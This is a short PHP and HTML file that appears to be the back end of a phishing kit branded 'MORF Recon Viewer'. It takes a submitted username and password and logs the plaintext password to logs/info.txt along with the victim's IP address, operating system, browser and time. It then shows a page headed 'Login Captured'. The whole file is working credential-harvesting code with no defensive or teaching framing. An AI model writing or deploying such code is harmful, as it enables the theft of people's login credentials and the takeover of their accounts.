<?php
// Get IP and user agent
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Detect browser
function getBrowser($uagent) {
    if (strpos($uagent, 'Firefox') !== false) return 'Firefox';
    if (strpos($uagent, 'Chrome') !== false) return 'Chrome';
    if (strpos($uagent, 'Safari') !== false) return 'Safari';
    if (strpos($uagent, 'MSIE') !== false || strpos($uagent, 'Trident') !== false) return 'Internet Explorer';
    return 'Unknown';
}

// Detect OS
function getOS($uagent) {
    if (preg_match('/Android/', $uagent)) return 'Android';
    if (preg_match('/iPhone|iPad/', $uagent)) return 'iOS';
    if (preg_match('/Windows/', $uagent)) return 'Windows';
    if (preg_match('/Mac/', $uagent)) return 'macOS';
    if (preg_match('/Linux/', $uagent)) return 'Linux';
    return 'Unknown';
}

$browser = getBrowser($userAgent);
$os = getOS($userAgent);
$time = date("Y-m-d H:i:s");

// Form data
$username = htmlspecialchars($_POST['username']);
$password = htmlspecialchars($_POST['password']); // plain password for display
$hashedPassword = password_hash($password, PASSWORD_DEFAULT); // hashed for storage

// Save to logs
$log = "[$time] Username: $username | Password : $password | IP: $ip | OS: $os | Browser: $browser\n";
file_put_contents("logs/info.txt", $log, FILE_APPEND | LOCK_EX);
?>

<!DOCTYPE html>
<html>
<head>
  <title>Logged Info - MORF</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <h1>✅ Login Captured</h1>

  <div class="info-box">
    <p><strong>👤 Username:</strong> <?php echo $username; ?></p>
    <p><strong>🔑 Password:</strong> <?php echo $password; ?></p>
    <p><strong>🌐 IP Address:</strong> <?php echo $ip; ?></p>
    <p><strong>🧠 OS:</strong> <?php echo $os; ?></p>
    <p><strong>🧭 Browser:</strong> <?php echo $browser; ?></p>
    <p><strong>📅 Time:</strong> <?php echo $time; ?></p>
    <p><strong>📏 Screen Size:</strong> <span id="screenInfo">Loading...</span></p>
  </div>

  <footer>🔐 MORF Recon Viewer</footer>

  <script>
    document.getElementById("screenInfo").textContent = `${screen.width} x ${screen.height}`;
  </script>
</body>
</html>
